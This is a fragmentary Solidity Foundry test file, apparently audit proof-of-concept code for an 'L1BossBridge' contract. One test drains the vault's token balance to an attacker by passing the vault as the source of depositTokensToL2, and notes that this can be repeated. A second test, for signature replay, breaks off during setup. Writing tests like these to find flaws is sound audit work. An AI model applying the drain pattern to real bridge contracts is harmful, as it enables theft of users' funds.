...
contract L1BossBridgeTest is Test {
    ...
    function testCantTransferFromVaultToVault() public {
        // address attacker = makeAddr("attacker");
        ...
        // can do the operation continuously
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
    }
    ...
    function testSignatureReplay() public {
        //assume the vault already holds same tokens
        ...
        // signer / Operator is going to sign he withdraw
